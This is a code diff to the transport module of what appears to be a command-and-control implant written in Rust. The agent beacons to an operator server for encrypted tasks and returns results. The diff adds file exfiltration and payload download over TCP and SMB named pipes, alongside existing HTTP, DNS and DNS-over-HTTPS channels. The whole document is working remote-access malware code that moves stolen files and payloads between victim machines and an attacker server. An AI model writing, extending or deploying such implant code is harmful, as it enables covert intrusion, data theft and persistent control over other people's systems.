@@ -6,7 +6,7 @@
 /// Beacon:       GET  /beacon/<id> or TCP "beacon" → AES-GCM tasks; 204/no_tasks = none
 /// Result:       POST /result/<id> or TCP "result" → AES-GCM {task_id,output,error,is_admin}
 /// Upload:       POST /upload/<id>/<name> or TCP "upload" → AES-GCM {task_id,filename,data}
-/// Download:     GET  /dl/<id>/<name> → AES-GCM raw bytes (TCP: not supported)
+/// Download:     GET  /dl/<id>/<name> → AES-GCM raw bytes
 use core::ffi::c_void;
 use core::ptr;
 use std::io::{Read, Write};
@@ -391,6 +391,11 @@ pub(crate) fn http_do_inner(method: &str, path: &str, body: &[u8], _cert_ctx: *m
     http_do_linux_inner(method, path, body, "")
 }
 
+fn file_name_url(filename: &str) -> String {
+    let name = filename.rsplit(['/', '\\']).next().unwrap_or(filename);
+    transport_doh::url_encode(name)
+}
+
 #[cfg(not(target_os = "windows"))]
 pub fn http_do(method: &str, path: &str, body: &[u8]) -> Option<(u32, Vec<u8>)> {
     http_do_linux_inner(method, path, body, "")
@@ -408,6 +413,9 @@ fn http_do_linux_inner(method: &str, path: &str, body: &[u8], extra_header: &str
     use std::net::TcpStream;
 
     let p = parse_url(config::SERVER_URL);
+    if p.is_https || config::TRANSPORT == "mtls" {
+        return None;
+    }
     let full_path = format!("{}{}", p.base, path);
 
     let addr = format!("{}:{}", p.host, p.port);
@@ -623,14 +631,17 @@ impl AgentTransport {
 
     /// Drain the server's ACK after a result/upload send.  Drops the connection
     /// if the ACK is missing or negative to let the main loop re-register.
-    fn tcp_recv_ack(&mut self) {
+    fn tcp_recv_ack(&mut self) -> bool {
         match self.tcp_recv_msg() {
             Some((t, p)) if t == "ack" => {
                 if let Some(false) = p["ok"].as_bool() {
                     self.tcp_conn = None;
+                    false
+                } else {
+                    true
                 }
             }
-            _ => { self.tcp_conn = None; }
+            _ => { self.tcp_conn = None; false }
         }
     }
 
@@ -721,7 +732,12 @@ impl AgentTransport {
                 let id   = j["id"].as_i64().unwrap_or(0);
                 let typ  = j["type"].as_str().unwrap_or("").to_string();
                 let args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
-                return vec![TaskWire { id, typ, args, payload: vec![] }];
+                let payload = j.get("payload")
+                    .and_then(|v| v.as_str())
+                    .filter(|s| !s.is_empty())
+                    .and_then(|s| STANDARD.decode(s).ok())
+                    .unwrap_or_default();
+                return vec![TaskWire { id, typ, args, payload }];
             }
             "doh" => {
                 // GET /dns-query?name=b.<dohEncode(agentID)>&type=TXT
@@ -829,7 +845,7 @@ impl AgentTransport {
                 let enc     = crypto::seal(&self.aes_key, plain.as_bytes());
                 let payload = Value::String(STANDARD.encode(&enc));
                 if !self.tcp_send_msg("result", &payload) { self.tcp_conn = None; return; }
-                self.tcp_recv_ack();
+                if !self.tcp_recv_ack() { self.tcp_conn = None; return; }
                 return;
             }
             _ => {}
@@ -878,25 +894,29 @@ impl AgentTransport {
         let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
     }
 
-    pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) {
+    pub fn upload_file(&mut self, task_id: i64, filename: &str, data: &[u8]) -> bool {
         match config::TRANSPORT {
             "dns" => {
-                // Not supported — send a note as the result
+                // DNS has no file channel; report the actual failure to the
+                // operator and let callers avoid a misleading success result.
                 self.send_result(task_id,
                     &format!("file:{}:size={}", filename, data.len()),
                     "upload-not-supported-over-dns");
-                return;
+                return false;
             }
             #[cfg(target_os = "windows")]
             "smb" => {
-                self.send_result(task_id,
-                    &format!("file:{}:size={}", filename, data.len()),
-                    "upload-not-supported-over-smb");
-                return;
+                if self.aes_key.is_empty() || self.smb_pipe == -1isize { return false; }
+                let enc = crypto::seal(&self.aes_key, data);
+                let name = file_name_url(filename);
+                let path = format!("/upload/{}/{}?task_id={}", self.agent_id, name, task_id);
+                return match transport_smb::relay(self.smb_pipe, "POST", &path, &enc) {
+                    Some((200, _)) => true,
+                    _ => false,
+                };
             }
             "tcp" => {
-                if self.aes_key.is_empty() { return; }
-                if data.is_empty() { return; }
+                if self.aes_key.is_empty() || data.is_empty() { return false; }
                 const CHUNK_SIZE: usize = 8 * 1024 * 1024;
                 let chunks: Vec<&[u8]> = data.chunks(CHUNK_SIZE).collect();
                 let total_chunks = chunks.len();
@@ -912,29 +932,59 @@ impl AgentTransport {
                     }).to_string();
                     let enc     = crypto::seal(&self.aes_key, inner.as_bytes());
                     let payload = Value::String(STANDARD.encode(&enc));
-                    if !self.tcp_send_msg("upload_chunk", &payload) { self.tcp_conn = None; return; }
-                    self.tcp_recv_ack();
+                    if !self.tcp_send_msg("upload_chunk", &payload) { self.tcp_conn = None; return false; }
+                    if !self.tcp_recv_ack() { self.tcp_conn = None; return false; }
                 }
-                return;
+                return self.tcp_conn.is_some();
             }
             _ => {}
         }
-        if self.aes_key.is_empty() { return; }
+        if self.aes_key.is_empty() { return false; }
         let enc  = crypto::seal(&self.aes_key, data);
-        let path = format!("/upload/{}/{}", self.agent_id, filename);
-        let _ = http_do_inner("POST", &path, &enc, self.cert_ctx);
+        let path = format!("/upload/{}/{}", self.agent_id, file_name_url(filename));
+        let (code, _) = http_do_inner("POST", &path, &enc, self.cert_ctx).unwrap_or((0, vec![]));
+        code == 200
     }
 
     pub fn download_file(&mut self, filename: &str) -> Vec<u8> {
         match config::TRANSPORT {
             "dns" => return vec![],
+            "tcp" => {
+                if self.aes_key.is_empty() || !self.tcp_ensure_connected() { return vec![]; }
+                let request = serde_json::json!({"filename": filename}).to_string();
+                let enc = crypto::seal(&self.aes_key, request.as_bytes());
+                let payload = Value::String(STANDARD.encode(&enc));
+                if !self.tcp_send_msg("download", &payload) {
+                    self.tcp_conn = None;
+                    return vec![];
+                }
+                let (typ, response) = match self.tcp_recv_msg() {
+                    Some(v) => v,
+                    None => { self.tcp_conn = None; return vec![]; }
+                };
+                if typ != "dl_resp" { return vec![]; }
+                let encoded = match response.as_str() { Some(v) => v, None => return vec![] };
+                let encrypted = match STANDARD.decode(encoded) { Ok(v) => v, Err(_) => return vec![] };
+                let plain = match crypto::open(&self.aes_key, &encrypted) { Some(v) => v, None => return vec![] };
+                let body: Value = match serde_json::from_slice(&plain) { Ok(v) => v, Err(_) => return vec![] };
+                if !body.get("found").and_then(|v| v.as_bool()).unwrap_or(false) { return vec![]; }
+                let data = match body.get("data").and_then(|v| v.as_str()) { Some(v) => v, None => return vec![] };
+                return STANDARD.decode(data).unwrap_or_default();
+            }
             #[cfg(target_os = "windows")]
-            "smb" => return vec![],
-            "tcp" => return vec![],
+            "smb" => {
+                if self.smb_pipe == -1isize { return vec![]; }
+                let path = format!("/dl/{}/{}", self.agent_id, file_name_url(filename));
+                let (_, encrypted) = match transport_smb::relay(self.smb_pipe, "GET", &path, &[]) {
+                    Some(v) => v,
+                    None => return vec![],
+                };
+                return crypto::open(&self.aes_key, &encrypted).unwrap_or_default();
+            }
             _ => {}
         }
         if self.aes_key.is_empty() { return vec![]; }
-        let path = format!("/dl/{}/{}", self.agent_id, filename);
+        let path = format!("/dl/{}/{}", self.agent_id, file_name_url(filename));
         let (code, resp) = http_do_inner("GET", &path, &[], self.cert_ctx).unwrap_or((0, vec![]));
         if code != 200 || resp.is_empty() { return vec![]; }
         crypto::open(&self.aes_key, &resp).unwrap_or_default()
